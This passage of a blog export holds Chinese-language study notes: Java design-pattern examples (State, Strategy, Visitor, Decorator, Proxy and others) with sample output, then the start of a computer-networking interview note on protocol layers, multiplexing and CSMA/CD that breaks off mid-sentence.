1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public class GumballMachine &#123; private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) &#123; count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs &gt; 0) &#123; state = noQuarterState; &#125; else &#123; state = soldOutState; &#125; &#125; public void insertQuarter() &#123; state.insertQuarter(); &#125; public void ejectQuarter() &#123; state.ejectQuarter(); &#125; public void turnCrank() &#123; state.turnCrank(); state.dispense(); &#125; public void setState(State state) &#123; this.state = state; &#125; public void releaseBall() &#123; System.out.println("A gumball comes rolling out the slot..."); if (count != 0) &#123; count -= 1; &#125; &#125; public State getSoldOutState() &#123; return soldOutState; &#125; public State getNoQuarterState() &#123; return noQuarterState; &#125; public State getHasQuarterState() &#123; return hasQuarterState; &#125; public State getSoldState() &#123; return soldState; &#125; public int getCount() &#123; return count; &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; public static void main(String[] args) &#123; GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); &#125;&#125; 12345678910111213141516171819202122232425You insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterQuarter returnedYou turned, but there's no quarterYou need to pay firstYou insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...You haven't insert a quarterYou insert a quarterYou can't insert another quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...Oops, out of gumballsYou can't insert a quarter, the machine is sold outYou turned, but there are no gumballsNo gumball dispensed 9. 策略（Strategy）意图定义一系列算法，封装每个算法，并使它们可以互换。 策略模式可以让算法独立于使用它的客户端。 类图 Strategy 接口定义了一个算法族，它们都具有 behavior() 方法。 Context 是使用到该算法族的类，其中的 doSomething() 方法会调用 behavior()，setStrategy(in Strategy) 方法可以动态地改变 strategy 对象，也就是说能动态地改变 Context 所使用的算法。 与状态模式的比较状态模式的类图和策略模式类似，并且都是能够动态改变对象的行为。 但是状态模式是通过状态转移来改变 Context 所组合的 State 对象，而策略模式是通过 Context 本身的决策来改变组合的 Strategy 对象。 所谓的状态转移，是指 Context 在运行过程中由于一些条件发生改变而使得 State 对象发生改变，注意必须要是在运行过程中。 状态模式主要是用来解决状态转移的问题，当状态发生转移了，那么 Context 对象就会改变它的行为；而策略模式主要是用来封装一组可以互相替代的算法族，并且可以根据需要动态地去替换 Context 使用的算法。 实现设计一个鸭子，它可以动态地改变叫声。这里的算法族是鸭子的叫声行为。 123public interface QuackBehavior &#123; void quack();&#125; 123456public class Quack implements QuackBehavior &#123; @Override public void quack() &#123; System.out.println("quack!"); &#125;&#125; 123456public class Squeak implements QuackBehavior&#123; @Override public void quack() &#123; System.out.println("squeak!"); &#125;&#125; 12345678910111213public class Duck &#123; private QuackBehavior quackBehavior; public void performQuack() &#123; if (quackBehavior != null) &#123; quackBehavior.quack(); &#125; &#125; public void setQuackBehavior(QuackBehavior quackBehavior) &#123; this.quackBehavior = quackBehavior; &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); &#125;&#125; 12squeak!quack! JDK java.util.Comparator#compare() javax.servlet.http.HttpServlet javax.servlet.Filter#doFilter() 10. 模板方法（Template Method）意图定义算法框架，并将一些步骤的实现延迟到子类。 通过模板方法，子类可以重新定义算法的某些步骤，而不用改变算法的结构。 类图 实现冲咖啡和冲茶都有类似的流程，但是某些步骤会有点不一样，要求复用那些相同步骤的代码。 123456789101112131415161718192021public abstract class CaffeineBeverage &#123; final void prepareRecipe() &#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125; abstract void brew(); abstract void addCondiments(); void boilWater() &#123; System.out.println("boilWater"); &#125; void pourInCup() &#123; System.out.println("pourInCup"); &#125;&#125; 1234567891011public class Coffee extends CaffeineBeverage&#123; @Override void brew() &#123; System.out.println("Coffee.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Coffee.addCondiments"); &#125;&#125; 1234567891011public class Tea extends CaffeineBeverage&#123; @Override void brew() &#123; System.out.println("Tea.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Tea.addCondiments"); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println("-----------"); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); &#125;&#125; 123456789boilWaterCoffee.brewpourInCupCoffee.addCondiments-----------boilWaterTea.brewpourInCupTea.addCondiments JDK java.util.Collections#sort() java.io.InputStream#skip() java.io.InputStream#read() java.util.AbstractList#indexOf() 11. 访问者（Visitor）意图为一个对象结构（比如组合结构）增加新能力。 类图 Visitor：访问者，为每一个 ConcreteElement 声明一个 visit 操作 ConcreteVisitor：具体访问者，存储遍历过程中的累计结果 ObjectStructure：对象结构，可以是组合结构，或者是一个集合。 实现123public interface Element &#123; void accept(Visitor visitor);&#125; 1234567891011121314class CustomerGroup &#123; private List&lt;Customer&gt; customers = new ArrayList&lt;&gt;(); void accept(Visitor visitor) &#123; for (Customer customer : customers) &#123; customer.accept(visitor); &#125; &#125; void addCustomer(Customer customer) &#123; customers.add(customer); &#125;&#125; 123456789101112131415161718192021222324public class Customer implements Element &#123; private String name; private List&lt;Order&gt; orders = new ArrayList&lt;&gt;(); Customer(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; void addOrder(Order order) &#123; orders.add(order); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Order order : orders) &#123; order.accept(visitor); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930public class Order implements Element &#123; private String name; private List&lt;Item&gt; items = new ArrayList(); Order(String name) &#123; this.name = name; &#125; Order(String name, String itemName) &#123; this.name = name; this.addItem(new Item(itemName)); &#125; String getName() &#123; return name; &#125; void addItem(Item item) &#123; items.add(item); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Item item : items) &#123; item.accept(visitor); &#125; &#125;&#125; 12345678910111213141516public class Item implements Element &#123; private String name; Item(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); &#125;&#125; 1234567public interface Visitor &#123; void visit(Customer customer); void visit(Order order); void visit(Item item);&#125; 123456789101112131415161718192021222324252627public class GeneralReport implements Visitor &#123; private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) &#123; System.out.println(customer.getName()); customersNo++; &#125; public void visit(Order order) &#123; System.out.println(order.getName()); ordersNo++; &#125; public void visit(Item item) &#123; System.out.println(item.getName()); itemsNo++; &#125; public void displayResults() &#123; System.out.println("Number of customers: " + customersNo); System.out.println("Number of orders: " + ordersNo); System.out.println("Number of items: " + itemsNo); &#125;&#125; 1234567891011121314151617181920212223public class Client &#123; public static void main(String[] args) &#123; Customer customer1 = new Customer("customer1"); customer1.addOrder(new Order("order1", "item1")); customer1.addOrder(new Order("order2", "item1")); customer1.addOrder(new Order("order3", "item1")); Order order = new Order("order_a"); order.addItem(new Item("item_a1")); order.addItem(new Item("item_a2")); order.addItem(new Item("item_a3")); Customer customer2 = new Customer("customer2"); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); &#125;&#125; 123456789101112131415customer1order1item1order2item1order3item1customer2order_aitem_a1item_a2item_a3Number of customers: 2Number of orders: 4Number of items: 6 JDK javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor 12. 空对象（Null）意图使用什么都不做的空对象来替代 NULL。 一个方法返回 NULL，意味着方法的调用端需要去检查返回值是否是 NULL，这么做会导致非常多的冗余的检查代码。并且如果某一个调用端忘记了做这个检查返回值，而直接使用返回的对象，那么就有可能抛出空指针异常。 类图 实现123public abstract class AbstractOperation &#123; abstract void request();&#125; 123456public class RealOperation extends AbstractOperation &#123; @Override void request() &#123; System.out.println("do something"); &#125;&#125; 123456public class NullOperation extends AbstractOperation&#123; @Override void request() &#123; // do nothing &#125;&#125; 12345678910111213public class Client &#123; public static void main(String[] args) &#123; AbstractOperation abstractOperation = func(-1); abstractOperation.request(); &#125; public static AbstractOperation func(int para) &#123; if (para &lt; 0) &#123; return new NullOperation(); &#125; return new RealOperation(); &#125;&#125; 四、结构型1. 适配器（Adapter）意图把一个类接口转换成另一个用户需要的接口。 类图 实现鸭子（Duck）和火鸡（Turkey）拥有不同的叫声，Duck 的叫声调用 quack() 方法，而 Turkey 调用 gobble() 方法。 要求将 Turkey 的 gobble() 方法适配成 Duck 的 quack() 方法，从而让火鸡冒充鸭子！ 123public interface Duck &#123; void quack();&#125; 123public interface Turkey &#123; void gobble();&#125; 123456public class WildTurkey implements Turkey &#123; @Override public void gobble() &#123; System.out.println("gobble!"); &#125;&#125; 123456789101112public class TurkeyAdapter implements Duck &#123; Turkey turkey; public TurkeyAdapter(Turkey turkey) &#123; this.turkey = turkey; &#125; @Override public void quack() &#123; turkey.gobble(); &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); &#125;&#125; JDK java.util.Arrays#asList() java.util.Collections#list() java.util.Collections#enumeration() javax.xml.bind.annotation.adapters.XMLAdapter 2. 桥接（Bridge）意图将抽象与实现分离开来，使它们可以独立变化。 类图 Abstraction：定义抽象类的接口 Implementor：定义实现类接口 实现RemoteControl 表示遥控器，指代 Abstraction。 TV 表示电视，指代 Implementor。 桥接模式将遥控器和电视分离开来，从而可以独立改变遥控器或者电视的实现。 1234567public abstract class TV &#123; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 12345678910111213141516public class Sony extends TV&#123; @Override public void on() &#123; System.out.println("Sony.on()"); &#125; @Override public void off() &#123; System.out.println("Sony.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("Sony.tuneChannel()"); &#125;&#125; 12345678910111213141516public class RCA extends TV&#123; @Override public void on() &#123; System.out.println("RCA.on()"); &#125; @Override public void off() &#123; System.out.println("RCA.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("RCA.tuneChannel()"); &#125;&#125; 12345678910111213public abstract class RemoteControl &#123; protected TV tv; public RemoteControl(TV tv) &#123; this.tv = tv; &#125; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl1 extends RemoteControl &#123; public ConcreteRemoteControl1(TV tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl1.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl1.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl1.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl2 extends RemoteControl &#123; public ConcreteRemoteControl2(TV tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl2.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl2.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl2.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); &#125;&#125; JDK AWT (It provides an abstraction layer which maps onto the native OS the windowing support.) JDBC 3. 组合（Composite）意图将对象组合成树形结构来表示“整体/部分”层次关系，允许用户以相同的方式处理单独对象和组合对象。 类图组件（Component）类是组合类（Composite）和叶子类（Leaf）的父类，可以把组合类看成是树的中间节点。 组合对象拥有一个或者多个组件对象，因此组合对象的操作可以委托给组件对象去处理，而组件对象可以是另一个组合对象或者叶子对象。 实现1234567891011121314151617public abstract class Component &#123; protected String name; public Component(String name) &#123; this.name = name; &#125; public void print() &#123; print(0); &#125; abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component);&#125; 123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;import java.util.List;public class Composite extends Component &#123; private List&lt;Component&gt; child; public Composite(String name) &#123; super(name); child = new ArrayList&lt;&gt;(); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("Composite:" + name); for (Component component : child) &#123; component.print(level + 1); &#125; &#125; @Override public void add(Component component) &#123; child.add(component); &#125; @Override public void remove(Component component) &#123; child.remove(component); &#125;&#125; 1234567891011121314151617181920212223public class Leaf extends Component &#123; public Leaf(String name) &#123; super(name); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("left:" + name); &#125; @Override public void add(Component component) &#123; throw new UnsupportedOperationException(); // 牺牲透明性换取单一职责原则，这样就不用考虑是叶子节点还是组合节点 &#125; @Override public void remove(Component component) &#123; throw new UnsupportedOperationException(); &#125;&#125; 123456789101112131415161718public class Client &#123; public static void main(String[] args) &#123; Composite root = new Composite("root"); Component node1 = new Leaf("1"); Component node2 = new Composite("2"); Component node3 = new Leaf("3"); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf("21"); Component node22 = new Composite("22"); node2.add(node21); node2.add(node22); Component node221 = new Leaf("221"); node22.add(node221); root.print(); &#125;&#125; 1234567Composite:root--left:1--Composite:2----left:21----Composite:22------left:221--left:3 JDK javax.swing.JComponent#add(Component) java.awt.Container#add(Component) java.util.Map#putAll(Map) java.util.List#addAll(Collection) java.util.Set#addAll(Collection) 4. 装饰（Decorator）意图为对象动态添加功能。 类图装饰者（Decorator）和具体组件（ConcreteComponent）都继承自组件（Component），具体组件的方法实现不需要依赖于其它对象，而装饰者组合了一个组件，这样它可以装饰其它装饰者或者具体组件。所谓装饰，就是把这个装饰者套在被装饰上，从而动态扩展被装饰者的功能。装饰者的方法有一部分是自己的，这属于它的功能，然后调用被装饰者的方法实现，从而也保留了被装饰者的功能。可以看到，具体组件应当是装饰层次的最低层，因为只有具体组件的方法实现不需要依赖于其它对象。 实现设计不同种类的饮料，饮料可以添加配料，比如可以添加牛奶，并且支持动态添加新配料。每增加一种配料，该饮料的价格就会增加，要求计算一种饮料的价格。 下图表示在 DarkRoast 饮料上新增新添加 Mocha 配料，之后又添加了 Whip 配料。DarkRoast 被 Mocha 包裹，Mocha 又被 Whip 包裹。它们都继承自相同父类，都有 cost() 方法，外层类的 cost() 方法调用了内层类的 cost() 方法。 123public interface Beverage &#123; double cost();&#125; 123456public class DarkRoast implements Beverage &#123; @Override public double cost() &#123; return 1; &#125;&#125; 123456public class HouseBlend implements Beverage &#123; @Override public double cost() &#123; return 1; &#125;&#125; 123public abstract class CondimentDecorator implements Beverage &#123; protected Beverage beverage;&#125; 1234567891011public class Milk extends CondimentDecorator &#123; public Milk(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 1234567891011public class Mocha extends CondimentDecorator &#123; public Mocha(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); &#125;&#125; 13.0 设计原则类应该对扩展开放，对修改关闭：也就是添加新功能时不需要修改代码。饮料可以动态添加新的配料，而不需要去修改饮料的代码。 不可能把所有的类设计成都满足这一原则，应当把该原则应用于最有可能发生改变的地方。 JDK java.io.BufferedInputStream(InputStream) java.io.DataInputStream(InputStream) java.io.BufferedOutputStream(OutputStream) java.util.zip.ZipOutputStream(OutputStream) java.util.Collections#checkedList|Map|Set|SortedSet|SortedMap 5. 外观（Facade）意图提供了一个统一的接口，用来访问子系统中的一群接口，从而让子系统更容易使用。 类图 实现观看电影需要操作很多电器，使用外观模式可以实现一键看电影功能。 12345678910111213public class SubSystem &#123; public void turnOnTV() &#123; System.out.println("turnOnTV()"); &#125; public void setCD(String cd) &#123; System.out.println("setCD( " + cd + " )"); &#125; public void starWatching()&#123; System.out.println("starWatching()"); &#125;&#125; 123456789public class Facade &#123; private SubSystem subSystem = new SubSystem(); public void watchMovie() &#123; subSystem.turnOnTV(); subSystem.setCD("a movie"); subSystem.starWatching(); &#125;&#125; 123456public class Client &#123; public static void main(String[] args) &#123; Facade facade = new Facade(); facade.watchMovie(); &#125;&#125; 设计原则最少知识原则：只和你的密友谈话。也就是客户对象所需要交互的对象应当尽可能少。 6. 享元（Flyweight）意图利用共享的方式来支持大量细粒度的对象，这些对象一部分内部状态是相同的。 类图 Flyweight：享元对象 IntrinsicState：内部状态，相同的项元对象共享 ExtrinsicState：外部状态 实现123public interface Flyweight &#123; void doOperation(String extrinsicState);&#125; 123456789101112131415public class ConcreteFlyweight implements Flyweight &#123; private String intrinsicState; public ConcreteFlyweight(String intrinsicState) &#123; this.intrinsicState = intrinsicState; &#125; @Override public void doOperation(String extrinsicState) &#123; System.out.println("Object address: " + System.identityHashCode(this)); System.out.println("IntrinsicState: " + intrinsicState); System.out.println("ExtrinsicState: " + extrinsicState); &#125;&#125; 1234567891011121314import java.util.HashMap;public class FlyweightFactory &#123; private HashMap&lt;String, Flyweight&gt; flyweights = new HashMap&lt;&gt;(); Flyweight getFlyweight(String intrinsicState) &#123; if (!flyweights.containsKey(intrinsicState)) &#123; Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); &#125; return flyweights.get(intrinsicState); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight("aa"); Flyweight flyweight2 = factory.getFlyweight("aa"); flyweight1.doOperation("x"); flyweight2.doOperation("y"); &#125;&#125; 123456Object address: 1163157884IntrinsicState: aaExtrinsicState: xObject address: 1163157884IntrinsicState: aaExtrinsicState: y JDKJava 利用缓存来加速大量小对象的访问时间。 java.lang.Integer#valueOf(int) java.lang.Boolean#valueOf(boolean) java.lang.Byte#valueOf(byte) java.lang.Character#valueOf(char) 7. 代理（Proxy）意图控制对其它对象的访问。 类图代理有以下四类： 远程代理（Remote Proxy）：控制对远程对象（不同地址空间）的访问，它负责将请求及其参数进行编码，并向不同地址空间中的对象发送已经编码的请求。 虚拟代理（Virtual Proxy）：根据需要创建开销很大的对象，它可以缓存实体的附加信息，以便延迟对它的访问，例如在网站加载一个很大图片时，不能马上完成，可以用虚拟代理缓存图片的大小信息，然后生成一张临时图片代替原始图片。 保护代理（Protection Proxy）：按权限控制对象的访问，它负责检查调用者是否具有实现一个请求所必须的访问权限。 智能代理（Smart Reference）：取代了简单的指针，它在访问对象时执行一些附加操作：记录对象的引用次数，比如智能智能；当第一次引用一个持久化对象时，将它装入内存；在访问一个实际对象前，检查是否已经锁定了它，以确保其它对象不能改变它。 实现以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。 123public interface Image &#123; void showImage();&#125; 123456789101112131415161718192021222324252627282930313233public class HighResolutionImage implements Image &#123; private URL imageURL; private long startTime; private int height; private int width; public int getHeight() &#123; return height; &#125; public int getWidth() &#123; return width; &#125; public HighResolutionImage(URL imageURL) &#123; this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; &#125; public boolean isLoad() &#123; // 模拟图片加载，延迟 3s 加载完成 long endTime = System.currentTimeMillis(); return endTime - startTime &gt; 3000; &#125; @Override public void showImage() &#123; System.out.println("Real Image: " + imageURL); &#125;&#125; 1234567891011121314151617181920public class ImageProxy implements Image &#123; private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) &#123; this.highResolutionImage = highResolutionImage; &#125; @Override public void showImage() &#123; while (!highResolutionImage.isLoad()) &#123; try &#123; System.out.println("Temp Image: " + highResolutionImage.getWidth() + " " + highResolutionImage.getHeight()); Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; highResolutionImage.showImage(); &#125;&#125; 123456789public class ImageViewer &#123; public static void main(String[] args) throws Exception &#123; String image = "http://image.jpg"; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); &#125;&#125; JDK java.lang.reflect.Proxy RMI 参考资料 弗里曼. Head First 设计模式 [M]. 中国电力出版社, 2007. Gamma E. 设计模式: 可复用面向对象软件的基础 [M]. 机械工业出版社, 2007. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017. Design Patterns Design patterns implemented in Java The breakdown of design patterns in JDK]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%2F</url>
    <content type="text"><![CDATA[一、概述 网络的网络 ISP 主机之间的通信方式 电路交换与分组交换 时延 计算机网络体系结构* 二、物理层 通信方式 带通调制 三、数据链路层 基本问题 信道分类 信道复用技术 CSMA/CD 协议* PPP 协议 MAC 地址 局域网 以太网* 交换机* 虚拟局域网 四、网络层* 概述 IP 数据报格式 IP 地址编址方式 地址解析协议 ARP 网际控制报文协议 ICMP 虚拟专用网 VPN 网络地址转换 NAT 路由器的结构 路由器分组转发流程 路由选择协议 五、运输层* UDP 和 TCP 的特点 UDP 首部格式 TCP 首部格式 TCP 的三次握手 TCP 的四次挥手 TCP 滑动窗口 TCP 可靠传输 TCP 流量控制 TCP 拥塞控制 六、应用层 域名系统 文件传送协议 远程登录协议 电子邮件协议 动态主机配置协议 常用端口 Web 页面请求过程 参考资料 一、概述网络的网络网络把主机连接起来，而互联网是把多种不同的网络连接起来，因此互联网是网络的网络。 ISP互联网服务提供商 ISP 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。 目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。 互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。 主机之间的通信方式 客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方。 对等（P2P）：不区分客户和服务器。 电路交换与分组交换1. 电路交换电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。 2. 分组交换每个分组都有首部和尾部，包含了源地址和目的地址等控制信息，在同一个传输线路上同时传输多个分组互相不会影响，因此在同一条传输线路上允许同时传输多个分组，也就是说分组交换不需要占用传输线路。 考虑在一个邮局通信系统中，邮局收到一份邮件之后，先存储下来，然后把相同目的地的邮件一起转发到下一个目的地，这个过程就是存储转发过程，分组交换也使用了存储转发过程。 时延总时延 = 传输时延 + 传播时延 + 处理时延 + 排队时延 1. 传输时延主机或路由器传输数据帧所需要的时间。 其中 l 表示数据帧的长度，v 表示传输速率。 2. 传播时延电磁波在信道中传播一定的距离需要花费的时间，电磁波传播速度接近光速。 其中 l 表示信道长度，v 表示电磁波在信道上的传播速率。 3. 处理时延主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。 4. 排队时延分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量。 计算机网络体系结构* 1. 五层协议 应用层 ：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等。数据单位为报文。 运输层 ：提供的是进程间的通用数据传输服务。由于应用层协议很多，定义通用的运输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。 网络层 ：为主机间提供数据传输服务，而运输层协议是为主机中的进程提供服务。网络层把运输层传递下来的报文段或者用户数据报封装成分组。 数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的节点提供服务。数据链路层把网络层传来的分组封装成帧。 物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。 2. 七层协议其中表示层和会话层用途如下： 表示层 ：数据压缩、加密以及数据描述。这使得应用程序不必担心在各台主机中表示/存储的内部格式不同的问题。 会话层 ：建立及管理会话。 五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。 3. 数据在各层之间的传递过程在向下的过程中，需要添加下层协议所需要的首部或者尾部，而在向上的过程中不断拆开首部和尾部。 路由器只有下面三层协议，因为路由器位于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要运输层和应用层。 4. TCP/IP它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。 现在的 TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。 TCP/IP 协议族是一种沙漏形状，中间小两边大，IP 协议在其中占用举足轻重的地位。 二、物理层通信方式根据信息在传输线上的传送方向，分为以下三种通信方式： 单工通信：单向传输 半双工通信：双向交替传输 全双工通信：双向同时传输 带通调制模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。 三、数据链路层基本问题1. 封装成帧将网络层传下来的分组添加首部和尾部，用于标记帧的开始和结束。 2. 透明传输透明表示一个实际存在的事物看起来好像不存在一样。 帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符，如果出现转义字符，那么就在转义字符前面再加个转义字符，在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。 3. 差错检测目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。 信道分类1. 广播信道一对多通信，一个节点发送的数据能够被广播信道上所有的节点接收到。 所有的节点都在同一个广播信道上发送数据，因此需要有专门的控制方法进行协调，避免发生冲突（冲突也叫碰撞）。 主要有两种控制方法进行协调，一个是使用信道复用技术，一是使用 CSMA/CD 协议。 2. 点对点信道一对一通信。 因为不会发生碰撞，因此也比较简单，使用 PPP 协议进行控制。 信道复用技术1. 频分复用频分复用的所有主机在相同的时间占用不同的频率带宽资源。 2. 时分复用时分复用的所有主机在不同的时间占用相同的频率带宽资源。 使用频分复用和时分复用进行通信，在通信的过程中主机会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。 3. 统计时分复用是对时分复用的一种改进，不固定每个用户在时分复用帧中的位置，只要有数据就集中起来组成统计时分复用帧然后发送。 4. 波分复用光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。 5. 码分复用为每个用户分配 m bit 的码片，并且所有的码片正交，对于任意两个码片 和 有 为了讨论方便，取 m=8，设码片 为 00011011。在拥有该码片的用户发送比特 1 时就发送该码片，发送比特 0 时就发送该码片的反码 11100100。 在计算时将 00011011 记作 (-1 -1 -1 +1 +1 -1 +1 +1)，可以得到 其中 为 的反码。 利用上面的式子我们知道，当接收端使用码片 对接收到的数据进行内积运算时，结果为 0 的是其它用户发送的数据，结果为 1 的是用户发送的比特 1，结果为 -1 的是用户发送的比特 0。 码分复用需要发送的数据量为原先的 m 倍。 CSMA/CD 协议*CSMA/CD 表示载波监听多点接入 / 碰撞检测。 多点接入 ：说明这是总线型网络，许多主机以多点的方式连接到总线上。 载波监听 ：每个主机都必须不停地监听信道。在发送前，如果监听到信道正在使用，就必须等待。 碰撞检测 ：在发送中，如果监听到信道已有其它主机正在发送数据，就表示发生了碰撞。虽然每一个主机在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。 记端到端的传播时延为 τ，最先发送的站点最多经过 2τ 就可以知道是否发生了碰撞，称 2τ 为 争用期 。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用 截断二进制指数退避算法 来确定，从离散的整数集合 {0, 1, .., (2k-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为重传等待时间。 PPP 协议互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。 在 PPP 的帧中： F 字段为帧的定界符 A 和 C 字段暂时没有意义 FCS 字段是使用 